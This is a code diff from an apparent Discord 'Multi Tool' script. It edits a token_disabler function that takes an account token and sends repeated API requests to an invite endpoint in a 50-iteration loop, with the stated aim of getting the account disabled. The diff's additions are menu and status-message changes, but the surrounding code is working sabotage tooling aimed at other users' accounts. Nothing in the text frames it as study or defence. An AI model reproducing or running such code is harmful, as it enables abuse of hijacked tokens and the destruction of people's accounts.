@@ -304,7 +304,7 @@ def token_disabler():
         tkn_json = tkn.json()
         cls()
         menu()
-        print(f"{c}[{w}Disable token{c}] {w}| {c}Account disabled: {Fore.RED}False")
+        print(f"{c}[{w}Disable token{c}] {w}| {c}Trying to disable{w}...")
         for i in range(50):
             api = requests.get("https://discordapp.com/api/v6/invite/PGRqctPYHX")
             data = api.json()
@@ -317,6 +317,12 @@ def token_disabler():
                 'Content-Type': 'application/json'
             }
             tkn = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
+        sleep(.3)
+        exit=input(f"{c}[{w}Token info{c}] {w}| {Fore.YELLOW}Press enter{w}...")
+        cls()
+        menu()
+        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v2 | Lodi#0001")
+        options()
     elif tkn.status_code == 401:
         print(f"{c}[{w}Disable token{c}] {w}| {Fore.RED}Invalid token{w}.")
         sleep(.3)
